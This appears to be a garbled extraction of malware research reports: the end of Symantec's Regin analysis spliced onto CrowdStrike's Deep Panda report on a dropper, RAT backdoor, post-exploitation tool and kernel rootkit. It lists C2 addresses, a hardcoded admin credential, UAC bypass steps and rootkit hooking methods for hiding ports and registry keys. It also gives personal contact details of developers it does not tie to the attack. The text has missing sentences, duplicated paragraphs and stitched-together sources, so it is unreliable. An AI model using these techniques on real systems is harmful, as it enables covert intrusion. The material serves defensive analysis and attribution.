    •	 %Windir%\IME\IMESC5\DICTS\PINTLGBS.IMD contains Stage 5 data files, replacing SecurityLog.Evt in the 32-bit
       version
    •	 The equivalent files for SystemAudit.Evt and SecurityAudit.Evt were not recovered
    No Stage 5 payload modules have been recovered.Conclusion
    Regin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering
    campaigns.The development and operation of this threat would have required a significant investment of time
    and resources.Threats of this nature are rare and are only comparable to the Stuxnet/Duqu family of malware.The discovery of Regin serves to highlight how significant investments continue to be made into the development
    of tools for use in intelligence gathering.Many components of Regin have still gone undiscovered and additional
    functionality and versions may exist.Protection
    Symantec and Norton products detect this threat as Backdoor.Regin.Page 16
APPENDIX
                                                              Regin: Top-tier espionage tool enables stealthy surveillance




Appendix

 Data files
   Regin’s data files are classified as Stage 5 components and are contained in an EVFS container.Table 7.Data files used by Stage 4’s framework DLL
    Major      Minor      Description
    0001       -          -
    000D       -          -
    000F       01         High-entropy blobs, cryptographic data
               02         High-entropy blobs, cryptographic data

    003D       -          -
    0007       -          -
    000B       01         Contains a path to the log file.Data files used by Stage 5’s modules (payloads)
not have names.Just like Stage 5 modules, they are
referenced by their filetag, which is the aggregation      Major        Minor       Description
of the major and minor identifiers.The major              C363         02          6 bytes (01 00 00 00 00 00)
identifier indicates which major routine group likely      4E3B         -
handles or creates the file.290B         -
Not all data files have been recovered, so the             C375         01          Dword (1)
information remains incomplete.02          Dword (0)
Data files associated with Stage 4 kernel modules
                                                           C383         01          Dword (1)
have not been recovered
                                                                        02          Dword (0)
Table 8 lists recovered data files used by Stage 5
                                                                        10          64 bytes (512 bits)Diffie Hellman, p (prime)
modules.11          Byte (2)Diffie Hellman, g (generator)
The associated modules that supposedly
manipulate those data files were not recovered.The company’s
                                                                              more than 20,000 employees reside in more than 50 countries.Ninety-nine percent of Fortune 500 companies are Symantec
                                                                               customers.In fiscal 2014, it recorded revenues of $6.7 billion.To learn more go to www.symantec.com or connect with
                                                                                                       Symantec at: go.symantec.com/social/.For specific country offices and contact numbers, please visit our website.Symantec World Headquarters                                                                                  Copyright © 2014 Symantec Corporation.All
350 Ellis St.                                                                                                rights reserved.Symantec, the Symantec Logo,
                                                                                                             and the Checkmark Logo are trademarks or
Mountain View, CA 94043 USA                                                                                  registered trademarks of Symantec Corporation
+1 (650) 527-8000                                                                                             or its affiliates in the U.S. and other countries.1 (800) 721-3934                                                                                             Other names may be trademarks of their
www.symantec.com                                                                                                                             respective owners.Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation.NO WARRANTY .The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use.Any use
of the technical documentation or the information contained herein is at the risk of the user.Documentation may include technical or other inaccuracies or
typographical errors.Symantec reserves the right to make changes without prior notice.DEEP PANDA
INTELLIGENCE TEAM REPORT VER.All three samples provided remote access
to the attacker, via two Command and Control (C2) servers.One sample is typical of what is commonly
referred to as a ‘dropper’ because its primary purpose is to write a malicious component to disk and connect
it to the targeted hosts operating system.The malicious component in this case is what is commonly re-
ferred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed
as a service.The second sample analyzed is a dual use tool that can function both as a post exploitation
tool used to infect other systems, download additional tools, remove log data, and itself be used as a
backdoor.The third sample was a sophisticated implant that in addition to having multiple communication
capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can
hide aspects of the tool from user-mode tools.This third component is likely used for long-term
implantation and intelligence gathering.Some AV engines occasionally identify this sample as Derusbi
Trojan.CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT,
including 64-bit versions, used in targeted attacks in 2011 against Defense, Energy/Power, and Chemical
Industries in US and Japan.target various strategic interests of the United States including High Tech/Heavy Industry,
Non-Governmental Organizations (NGOs), State/Federal Government, Defense Industrial Base (DIB), and
organizations with vast economic interests.This report contains an in-depth technical analysis of the
samples, detection/remediation/mitigation information, attribution intelligence, and a conclusion aimed at
providing the reader with a synopsis of the report.CROWDSTRIKE                                                                          S E N S I T I VE          2
DEEP PANDA




                                   TECHNICAL ANALYSIS

Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)
The executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a ‘dropper’, which is
designed with the purpose of extracting from itself a malicious payload and to initialize and install it into a
targeted system.In this case, the malicious payload is a Dynamic-Link Library (DLL), which enables an
attacker to have full control of the system.This code appears to have been compiled on Wednesday May
4th, 2011 at 11:04:24 A.M. UTC (equivalent to early evening time in China).Note that the timestamp is in

resolves several library functions provided by Microsoft using the LoadLibrary() and GetProcAddress()
Application Programming Interfaces (APIs).The imported function names are not encrypted; however, the
function name is minutely obfuscated by a simple single character substitution:

   //Obfuscation of GetTempPathA() API function call
   strcpy((char *)ProcName, “2etTempPathA”);
   ProcName[0] = ‘G’;


The dropper invokes the SHGetSpecialFolderPath() API supplying a Constant Special Item ID List (CSIDL)
of ‘CSIDL_COMMON_DOCUMENTS’ to identify the destination folder for the malicious DLL payload.The

users.A typical path is C:\Documents and Settings\All Users\Documents.”



available name in this set:

       1.      infoadmn.dll
       2.      infoctrs.dll
       3.      infocardapi.dll




artifact which indicates the language setting on the compiler used by the person who built the binary was



CROWDSTRIKE                                                                           S E N S I T I VE            3
DEEP PANDA




code version.Since the dropped resource is not compressed, the routine fails.This indicates a low




parameter.This export then implements the actual install logic to maintain persistence and invoke the main
routine.The dropper binary contains an icon resource that resembles the ‘Google Chrome’ browser icon, the re-

systems language set to Chinese.The use of the Chrome icon may indicate a possible attempt to socially


CROWDSTRIKE                                                                       S E N S I T I VE            4
DEEP PANDA



Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)

14c04f88dc97aef3e9b516ef208a2bf5.This code appears to have been compiled on Wednesday May 4th,
2011 at 10:48:19 A.M. UTC (equivalent to early evening time in China).It is instantiated when it is mapped



service despite the appearance.If the service is present, the malware replaces its previous instances or
versions of this backdoor.After attempting to disable the existing service, the malware tries to install itself as
a service with that same name.During installation, the sample attempts to use documented APIs such as
OpenSCManager() and CreateService() to initialize itself as a persistent Windows service.As a
precaution, the sample writes settings directly to the Windows Registry to accomplish the same goal if
installing the service with the documented APIs fails.The registry change creates the following key:

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\msupdate\\Parameters

Following this, the subroutine will set the value of the ‘ServiceDLL’ to the module handle of the DLL.The next key to be changed is:
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost, which will have
the ‘msupdate’ key set to ‘msupdate’.The export ‘CollectW3PerfData’ is registered as the main function of the DLL.If the installation of the new
service is successful, the sample then starts the new service and exits.If the installation fails, the sample

exported function.In the case of installation failure, rundll32.exe calls the main functions export



over the machine, as rundll32.exe is frequently launched by tasks such as changing the time, wallpaper,
or other system settings.This means that after cleaning up the components dropped by the malware, the
system remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with
a malicious version and await it’s automatic execution by the Operating System.Window with class “NOD32_%d” where %d is replaced with a pseudo-random number.This may be an
attempt to fool some automated dynamic analysis or anti-malware software into believing this is the



After creating this window, the routine starts the main thread that eventually initiates calling out to the
Command and Control (C2).In order to accomplish this task, the newly




CROWDSTRIKE                                                                            S E N S I T I VE           5
DEEP PANDA



created thread initializes networking APIs using WSAStartup() and resolves some other APIs dynamically
using LoadLibrary() and GetProcAddress().Once the proper API’s have been resolved, the sample then
assigns a NULL SID to the rundll32.exe executable and sets the current process’ Window Station to
“winsta0”, which enables the sample to access the real user’s desktop if started as service.The communication to the C2 is handled by a while() loop, with each successive connection attempt
causing the loop to invoke the Windows Sleep() API for a time interval of 2 seconds, exponentially
increasing in length up to 1024 seconds (17 minutes) and then restarting back to 2 seconds.Initial C2 Phone Home Beacon


in the binary, using the User-Agent string “Google”, this code is not activated due to the format of the stat-

a raw socket to the C2 located at 1.9.5.38:443.This indicates the use of a ‘boiler plate code’ or a builder
software package that automates the creation of the malicious sample.The malicious sample sends an initial beacon to the C2 that includes the following information:




          Desktop session or “none” otherwise.The following python function can be used to decode the beacon stings:

 def decode(crypted):
 decoded=””
   for x in crypted:
     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)
   return decoded




CROWDSTRIKE                                                                          S E N S I T I VE            6
DEEP PANDA


After sending the initial beacon, the routine loops receiving incoming commands and executes them in
sequence.When a connection can successfully be established to the C2 server, the sleep timer is reset to
two seconds for the next attempt.Network Protocol and Implementation
The network protocol used by this sample resembles a ‘Type-Length-Value’ layout in both directions.Each 16 byte request header consists of:



       2.A 4-byte little-endian payload length
       3.8 bytes remaining are a request header that is typically uninitialized and only used by some
          commands instead of the arbitrary length payload




buffer of 408 bytes size.Providing additional payload of any larger size will result in a trivial exploitable stack

exploitation of this vulnerability is unnecessary due to the already available unauthenticated command
execution capabilities of this backdoor.Certain commands initiate a second connection to the C2 in a separate thread using the same network


Backdoor Functionality, Supported Commands
The primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote
Desktop over a custom protocol.It allows the adversary to view the main desktop graphically and
control the keyboard and mouse.This remote control functionality is implemented as separate messages

0x22000001 initiates continuous transmission of screen captures to the C2.The screen captures are
created using a series of Microsoft Windows Graphic Device Interface (GDI) API calls culminating in a call to
GetDIBits().Command 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor
from the system.CROWDSTRIKE                                                                             S E N S I T I VE           7
DEEP PANDA


When command 0x23000004 is received, a temporary new user “_DomainUser_” with password “Dom4!nU-
serP4ss” is created and added to the local Administrators group.The backdoor is then started under that
account and the user is deleted.It would appear this technique is meant to obfuscate the activities of the
malicious sample by masking the process creator’s user name to appear to be a generic domain user.Note
that such an account does not normally exist in an Active Directory environment.Additionally, the primary C2 connection allows for requests to start additional connections to the C2 imple-
menting the following functionality:



          killing of running processes

          output of arbitrary executables; initiated by command 0x23000000




Post Exploitation Tool Sample (MD5: 2dce7fc3f52a692d8a84a0c182519133)
This sample is typical of a post exploitation tool; it is written in .NET 2.0.This code appears to have been
compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China).The backdoor
functionality can be instantiated either directly from the command line or through commands issued over a
network based protocol via the C2.If no arguments are given, a connection to the C2 is initiated to the stati-



C2.line arguments can be viewed in Appendix A.This activity is generally associated with log cleaning to com-
plicate a forensic investigation.The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re-
source:




CROWDSTRIKE                                                                         S E N S I T I VE           8
DEEP PANDA




202.86.190.3:80 (Hong Kong: TeleOne(HK) Limited).Network Protocol and Implementation
There are three components to the protocol:

Authentication is accomplished using a 32 byte packet, this packet consists of:



       2.A four byte random number generated by the rand() function
       3.The machine ID comprised of an obfuscated combination of the Machine name and hard drive
          serial number.The algorithm for generating this is in Appendix B
       4.The communication protocol version number, which in this sample is 0x2
       5.The version of the malicious sample, in this case it is 841




An example authentication packet sent to the C2 is located in Appendix E




to the client which is then RC4 encrypted using the random number generated in step 2 from above as the
password.This value is then transformed using a simple algorithm in Appendix F into a 32 byte array.The

up AES encryption which is then used to encrypt and decrypt any further communications.CROWDSTRIKE                                                                       S E N S I T I VE          9
DEEP PANDA



Beacon, this is typical of this type of malicious sample, it allows the operator to separate various infected
hosts in a targeted campaign.The beacon for this sample is formatted as XML and consists of:




An example of an unencrypted beacon:

       <?xml version=”1.0” encoding=”utf-16”?>
       <BasicInfo xmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance” xmlns:xsd=”http://www.w3.org/2001/XMLSchema”>
        <HostName> Infected System Hostname</HostName>
        <int_0>-8</int_0>
        <osVersion>Microsoft Windows NT 6.1.7601 Service Pack 1</osVersion>
        <string_0>12/27/2011 16:34:36</string_0>
        <Version>2</Version>
       </BasicInfo>

Command handling loop, this is a loop structure that will process and execute commands sent by the C2.The malware sends and receives a heartbeat/keepalive packet every 2 minutes.The command format is
derived from a structure consisting of:




description of the possible values for commands is in Appendix D. It is important to note that the order in



calling methods on those assemblies, connecting to new C2 servers and executing processes.Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)

Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)
This sample is a sophisticated backdoor which implements several communications protocols and was



UTC (late evening time in China).The code contains several Run Time Type Information (RTTI) artifacts that


CROWDSTRIKE                                                                          S E N S I T I VE           10
DEEP PANDA


Variants of this Trojan are sometimes detected under the name ‘Derusbi’ by Microsoft, Trend, Sophos and
Symantec AV engines.This sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide
an interactive command line shell to the C2.It also is able to bypass User Account Control (UAC) to install
itself by using the ‘sysprep.exe’ Microsoft Windows executable provided by the targeted system.The steps it
takes to install itself onto a system are as follows:

        1.Copies itself to to %WINDIR%\system32\Msres<3 random characters>.ttf

           the current system time when the copy was made but with the year changed to 2005.MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service>” This defaults to “wuauserv”,

        4.Adds itself to list of services started by ‘netsvc’ using the service name ‘helpsvc’.5.If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules
           the copy to be deleted on reboot using the well documented MoveFileExA API.6.It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to
           the copy of itself it made in Step 1.The /u parameter means “uninstall”, which calls
           DllUnregisterServer, this is an unsophisticated method of DLL entry point obfuscation.7.DllUnregisterServer installs the driver and initiates the backdoor component.exe” is running (AntiVirus360 program from the Chinese ‘Quihoo 360 Technology Co., LTD’ 360              ),
or the username of the DLL’s host process context is not ‘SYSTEM’, the driver is not written to disk.Barring
the two aforementioned conditions, the sample decrypts the kernel driver to:

        “%sysdir%\Drivers\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys”

                                                                                                                 -

hash of dae6b9b3b8e39b08b10a51a6457444d8.“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security”




code.CROWDSTRIKE                                                                         S E N S I T I VE             11
DEEP PANDA



the backdoor then loads the original service’s DLL into the address space with LoadLibrary and invokes the
ServiceMain export.This effectively hijacks the original service’s entry while retaining its functionality.While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default

the one used by the post exploitation .NET tool.C2 Communication Mechanisms
The malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one
can be bundled in two different ‘dual’ modes (see 3.), totaling 7 distinct supported C2 mechanisms.The con-




       1.Proprietary binary header (optionally over an HTTP Proxy using CONNECT mechanism); this
          protocol consists of 64 random bytes being sent to the C2.The C2 then responds with 64 bytes



          bytes rotated right by seven bits and compares that value to the seven bits rotated right version of
          the server’s response, effectively neutralizing the rotation’s effect; the purpose of this is unclear.request string including HTTP headers (optionally over a HTTP Proxy using CONNECT).The
          malware requires the response to start with “HTTP/1.0 200” or “HTTP/1.1 200” and an absence of
          a “Connection: close” header.This one HTTP connection will be used for bi-directional
          communications, sending chunks of POST payload and receiving chunks of the response,
          interleaved.3.Two long-running HTTP requests to the same C2 (optionally over an HTTP Proxy with original
          request verb), one GET request to “/Photos/Query.cgi?loginid=” followed by a random number
          and one POST request to “/Catelog/login1.cgi”.The GET request serves as a down-stream
          channel while the POST request serves as a upstream channel.legitimate appearing channels as required in order to appear Request For Comment (RFC) compliant with
the HTTP protocol.CROWDSTRIKE                                                                         S E N S I T I VE           12
DEEP PANDA



due to time constraints.After establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will
start sending and receiving compressed binary blobs via the channel of choice.The C2’s binary data blobs
are compressed.No further encryption of the data takes place.All C2 transport implementations contain code for accepting and handling server-side connections of the
respective protocols.However, this code does not appear to be invoked.It appears that the author of this
code shares the library that implements these transports for the client with the C2 server.C2 Command Invocation
The main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any
of the following registered handler classes based upon a command ID.The handler class is responsible for
parsing the remainder of the command.PCC_PROXY: TCP Proxy
This handler class implements a generic TCP proxy.It supports establishing TCP connections to other hosts
and also listening for incoming connections.The incoming connection contents are forwarded to the C2 and
data from the C2 is passed on to connections.It supports up to 1024 parallel connections.PCC_MISC : Gather and report system information
The malware is capable of gathering various pieces of information from the system, triggered by a command
ID 10.The capabilities include recovering authentication credentials from various system and client storage
such as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS).This class also supports
gathering intelligence on the infected system including identifying security tools by their process name, proxy
accounts, and version numbers for the Operating System (OS) and Internet Explorer.PCC_SYS: System Management
This handler class provides the attacker with the ability to manage system components including start/stop/
delete system services, enumerate/alter registry keys, and manage running processes.This class also
provides the ability for the attacker to take a screen shot of the users desktop.INTERNAL_CMD: Command-Line Shell




CROWDSTRIKE                                                                         S E N S I T I VE          13
DEEP PANDA


This handler class uses the command ID 5 and implements an interactive command line shell accessible
from the C2 server, containing a series of built-in commands.If the input is not in this list of built-in
commands, the malware attempts to invoke cmd.exe in the background, launching a command or command
line utility already present on the system.The standard output channel of that command is provided back to
the C2.The supported built-in commands are:




Kill Switch / Self-Destruction
The only command that is implemented directly in the main backdoor thread as a subprocedure call and not
via a generic command handler class is command ID 256.This command results in the DLL deleting itself
and terminating the backdoor process.Kernel Driver Sample (MD5: dae6b9b3b8e39b08b10a51a6457444d8)
This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of:
de7500fc1065a081180841f32f06a537, this sample will only function on a Windows 32-bit kernel.This code
appears to have been compiled on Sunday October 9, 2011 at 4:50:31 P.M. UTC (very early morning time
of Monday, October 10 in China).Entrypoint
This section describes how the driver performs its initialization routine.Multiple Instance Protection
The driver begins by opening a named event in the BaseNamedObjects object directory with the name

exists, the driver fails to load, presumably to avoid a

CROWDSTRIKE                                                                      S E N S I T I VE         14
DEEP PANDA


multiple instances of itself.If the event does not exist, the driver then creates it using the Windows API



and indicative of relatively limited Windows API knowledge of the author of that part of the code.It is
interesting to note that some of the hex digits in the object name are mixed case which is potentially
indicative of the code being re-appropriated from another source.Anti-Debugging Protection
The second component of the entry point performs an anti-debugging technique, calling the function
KdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging
facility that is used by popular kernel debuggers KD and WinDbg.Tools such as Syser Debugger, or
debugging through a virtual machine are unaffected by this technique.The sample, rather than importing the
KdDisableDebugger() API using conventional methods, looks up the API through
MmGetSystemRoutineAddress() instead.All of the other APIs used by the driver are imported normally, so
this is not a technique to hide import APIs used throughout the driver.Searching Google for
“MmGetSystemRoutineAddress” and “KdDisableDebugger” results in dozens of Chinese language blogs
which explain how to use this technique to “Disable WinDbg”.Hooking

is designed to hook the system call table, while the other hooks the network stack.Network Stack Hooking

the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP/IP net-
work stack, most hooking operations will require a different implementation for these versions.On versions
prior to Windows Vista, the TCP/IP driver creates a \Device\Tcp device object through which most network
requests are piped through.On Vista and later, TCP/IP has been split up into multiple components, and IP
connection enumeration, which this driver is targeting, is managed by \Device\nsiproxy instead.In either case, the driver obtains the device object by using IoGetDeviceObjectPointer() and hooks Major
Function 14 the IRP_MJ_DEVICE_CONTROL, as this is the function through which all Input Output
ConTroLls (IOCTLs) are sent, such as the IOCTL for querying active IP connections.Network Store Interface (NSI) Hook
The NSI hook, targets IOCTL 0x12001B, which is used by NsiGetObjectAllParameters() in nsi.dll when
users typically run commands such as netstat.exe or use any of the IP Helper APIs in iphlpapi.dll.The
purpose of the hook is to scan the list of active connections returned to the user, and hide any such
connection currently bound to a local TCP port in




CROWDSTRIKE                                                                           S E N S I T I VE        15
DEEP PANDA


the range between 40000 and 45000.The hooking is performed by creating a new completion routine
associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL, attaching to the target
process, performing several memory copies to hide the entry, and detaching.This functionality is nearly identical to the code posted by Edward Sun (aka cardmagic, sunmy1@sina.com,
onlyonejazz@hotmail.com, cardcian@mail.ustc.edu.cn, QQ# 28025945) from Hefei, Anhui province
(Nanjing Military District) on July 8, 2007, then a China-based researcher at Trend Micro (now working at
                                                                                                          at
http://forum.eviloctal.com/viewthread.php?action=printable&tid=29604 (See Appendix G).CrowdStrike has
no information connecting Mr. Sun to this intrusion activity, his code appears to have been appropriated by
the actor to add similar functionality to their code.TCP Hook
The TCP hook works almost identically to the NSI hook, though instead hooking IOCTL 0x120003 (IOCTL_



any connections listening on TCP ports in the range between 40000 and 45000.System Call Hooking



DWORD at each of these exported functions.Because the system call stub uses the EAX register as an
index for the system call ID, and a “mov eax, imm32” instruction” instruction is used, this second DWORD
will match the system call ID.It then adds this index to the value of KeServiceDescriptorTable.Base, which
is the exported kernel variable (on 32-bit Windows only) which directly points to the system call table.This is
one of the simplest ways to do a system call hook, but will not work on 64-bit Windows as this variable is not
exported in addition to the protection provided by Microsoft PatchGuard.Windows API IoAllocateMdl(), and associating the MDL to a non-paged buffer using
MmBuildMdlForNonPagedPool().Once the MDL is associated to the non-paged buffer, the sample locks the
underlying pages using the Windows API MmProbeAndLockPages().Instead of hooking the entry in the
table directly, which is easily detectable, the driver uses the LDASM open-source disassembly engine to
analyze the function that is being pointed to by the table, and applying a Detours-style hook directly in the
code.It uses the standard “mov cr0, eax” technique, turning off the Write Protect (WP) bit as it does this.When the hook is installed, it writes a special DWORD value, ‘KDTR’, which allows it to prevent
double-hooking or badly-hooking the system call, during unhooking, this value is also checked.Registry Hooks
                                       \\REGISTRY\\MACHINE\\SYSTEM is blocked.RegSaveKey() which is

backup of a particular registry key.CROWDSTRIKE                                                                         S E N S I T I VE          16
DEEP PANDA



\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\.It then checks for the values of the
“ServiceDll” and “Security” keys, in the latter case it applies an XOR on the data with the value 127.The
user-mode component of this malware is a service called “msupdate”, this driver is attempting to hide the




key, due to the fact that these APIs provide almost identical functionality when it comes to reading registry
values.In the registry hooking code of the driver, a call is made to ObReferenceObjectByHandle().This allows the
driver to receive the ‘CM_KEY_OBJECT’ which is then used with ObQueryNameString() to get the key/value
path.However, no call to ObDereferenceObject() is ever made, which means that all registry objects being
sent to these APIs are eventually leaked.In the registry hook, it was noticed that “CurrentControlSet001” was used as the target, if the target machine

function as intended.This is the reason the Microsoft implemented a symbolic link to \\CurrentControlSet




CROWDSTRIKE                                                                         S E N S I T I VE            17
DEEP PANDA




                            MITIGATION / REMEDIATION


Network Signatures
The following network signatures are designed for the popular Open Source IDS called Snort.These signature can be ported to other formats upon request.Compiler artifacts and language settings can of course be deliberately masked or spoofed.CrowdStrike
 uses a unique approach of comprehensive threat analysis in order to decipher attributable components.Based on the corroborating evidence discovered in the course of this analysis, it appears there are
 numerous indications that this is a Chinese-speaking actor., a Chinese security product available from
 http://www.360.cn/.This is particularly relevant in this case because the backdoor DLL sample with an MD5

 this tool.Speculatively this may be because this security product detects this rootkit, or the author was
 attempting to prevent accidental infection on systems running this Anti-Virus product.The obfuscation of the KdDisableDebugger() function call is seen on several Chinese language forums,
 and can be seen being reused in several code samples on those forums.As previously mentioned there is
 no advantage associated with using this call obfuscation, and appears to be reused for no apparent reason
 other than the attackers have copied code directly from forum code.While the various network hooking techniques used in the kernel driver may appear novel or well

 ‘rootkit.com’ by a Chinese language developer.This post is currently mirrored on dozens of Chinese hacking
 websites.Similarly the system call hooking is less impressive after searching for “IoAllocateMdl” and “cr0” (bbs.pediy.com/showthread.php?t=77467
 perform system call hooking through MDLs.The ldasm inline hooking is also repeated in numerous postings
 to Chinese forums.One particular website (http://read.pudn.com/downloads197/sourcecode/windows/sys-
 tem/927802/CCRootkit/RootkitSys/HookSSDT.c__.htm) had an almost identical ldasm loop that tried to
 identify the exact same code sequences.Open source research of the 4 innocuous kernel APIs

 Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs.While the driver does not use pool tags for most of its allocations, it does utilize them in the networking
 hooking code, much like the examples found on the Chinese language forums.This sample uses pool tags:
 ‘tnet,’ and ‘KDTR’.Although the meaning of the KDTR tag is not




1 http://bbs.pediy.com/showthread.php?t=125358

 http://kost0911.pixnet.net/blog/post/36914183-anti-anti-windbg

  CROWDSTRIKE                                                                        S E N S I T I VE         20
DEEP PANDA



coincides with the matching functionality of the detour-style inline hook.The driver code (MD5: dae6b9b3b8e39b08b10a51a6457444d8) appears to be a combination of various
code that is easily searchable on the Internet, and almost always attributed to Chinese language forums
and websites.The system call hooking parts of the code appear to be identical to the HookSSDT.c code
authored by Steven Lai ‘embedlinux’ and utilized in what the author titled ‘CC Rootkit’ on on August 4, 2008
who’s email address is hqulyc@126.com.This user has a QQ identity of: 5054-3533, QQ is a popular

(http://user.qzone.qq.com/50543533) appears to be Steven Lai.He was is 28 years old (born September 5,

at Xiamen XOCECO New Technic Co., Ltd. (http://www.likego.com/en/about.asp), a company that builds

however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are
providing the background on this individual.According to this Linux driver development guide ‘embedlinux’ published on July 31, 2008 (http://wenku.baidu.com/view/e24205294b73f242336c5f45.html), t




 CROWDSTRIKE                                                                     S E N S I T I VE         24
DEEP PANDA




                                            CONCLUSION
The samples involved in this incident are typical of attacks commonly associated with the People’s
Republic of China (PRC).These code samples have a variety of Tools, Techniques, and Procedures (TTPs)



The ability to conduct Incident Response (IR) including forensics, and log analysis, greatly augments this
visibility into these aspects of the incident.Some indications as to the adversaries’ capabilities can be
derived from the captured samples alone.Dropper/Implant #1
The dropper code (MD5: 14c04f88dc97aef3e9b516ef208a2bf5) does not utilize any techniques that are
unique or unusual, and is consistent with tools, techniques, and procedures of attacks targeting proprietary
information and generally attributed to the PRC.The presence of dead code and its replacement by a more

side.The ‘dead code’ utilizes a more sophisticated compression algorithm provided by a third party which
was rendered useless for some reason.This may have been a result of the attacker modifying an existing
tool, or unknowingly using a re-purposed tool.The dropper resources indicate the compiler used to build the
tool was running on a system that utilized the Chinese “Simple” language pack and was built on Wednesday
May 4th, 2011 at 11:04:24 A.M. UTC (early evening time in China).While this can be deliberately spoofed

speaking actor.The dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical

                                                                                                                   -

encryption/obfuscation using a statically compiled XOR key.The sample uses TCP port 443 for commu-
nication, but makes no attempt to mimic the SSL protocol typically used on that port number, which would
provide enhanced Operational Security (OPSEC).This code appears to have been compiled on Wednes-
day May 4th, 2011 at 10:48:19 A.M. UTC (early evening time in China).Post Exploitation Tool
The post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be
dropped and executed by a client-side exploit, or the adversary can launch it using a variety of command
line options.This tool is built in Microsoft .NET framework, which is typically an indication of a less sophis-
ticated attacker, because .NET is easier to develop in but requires the .NET framework be present on the
victim machine.The tool appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M.
UTC (early evening time in China).The sample utilizes the AES cryptographic algorithm to protect its C2
communications.CROWDSTRIKE                                                                          S E N S I T I VE             25
DEEP PANDA



Implant #2
Backdoor DLL
This DLL is a moderately sophisticated backdoor with several well designed communication mechanisms
not typically seen in these types of implants.The code base for the sample was developed in C++.The
code appears to have been compiled on Sunday October 30, 2011 at 12:43:33 P.M. UTC (late evening time
in China).This sample has multiple communication capabilities available that makes it far more versatile
and stealthy.It implements relatively well thought out protocols including HTTP and DNS.The tool has the
ability to automatically down select the most effective communication channel once it has been instantiated,
which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement.The
DLL itself contains traces of the original C++ class names that were utilized in the source code, which in



communicating to the C2, thus enhancing OPSEC.The sample contains ‘dead code’ which appears to be
command and control server classes, this is likely an indicator that the C2 client which would communicate
with this sample shares the same communications library which was compiled into this sample.System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
CCRootkit package publicly by Steven Lai (a/k/a embedlinux).This kernel mode rootkit implements several
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
source code Steven Lai posted.This driver attempts to hide a wide swath of TCP ports (40000-45000) for
an unknown reason, however it is suspected that this may relate to the potential network relaying capability
alluded to for the backdoor dll.System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
CCRootkit package publicly by Steven Lai (a/k/a embedlinux).This kernel mode rootkit implements several
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
source code Steven Lai posted.This driver attempts to hide a wide swath of TCP ports (40000-45000) for
an unknown reason, however it is suspected that this may relate to the potential network relaying capability
alluded to for the backdoor dll.CROWDSTRIKE                                                                      S E N S I T I VE         26
DEEP PANDA




                                            APPENDIX
Appendix A: Command Line Options for Post Exploitation Tool Sample (MD5:
2dce7fc3f52a692d8a84a0c182519133


        iu - impersonate user, iu represents a username and expects the following additional arguments.id -domain
                 ip -password
        f - perform command based on value.Possible values listed below
                 sh - Connect to C2.x - hostname, connect to http address to download
                                  y - port
                                  u - username
                                  w - password
                         l - set up listener
                                  s - hostname
                                  p - port
                 v - display communication protocol version
                 dl
                         url - url to download from.ul
                      url - url to upload to.cl


               as to hide the tampering.p - target path
                       m

               tu
               date of 11-30-2005:12:00:00 with the UTC offset of the system applied.Appendix D: Raw bytes of example Authentication packet.remarks:       To
                                 update this object,
                                 please contact APNIC
                                 remarks:       host-
                                 masters and include
                                 your organisation’s
                                 account
                                 remarks:       name in
                                 the subject line.In this post, I will share with you a simple code to hide port under Vista,hope
it is useful for some guys .Actually under Windows Vista, netstat.exe will call InternalGetTcpTable2 which
is exported by Iphlpapi.dll to list all open ports,then InternalGetTcpTable2
will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll,

kernel mode module of NSI -- nsiproxy.sys.nsiproxy.sys is almost like a
wrapper of netio.sys, it will then call internal subroutines of netio.sys .Here ,we will use a relatively easy way -- “NSI Kernel Module Dispatch Routine

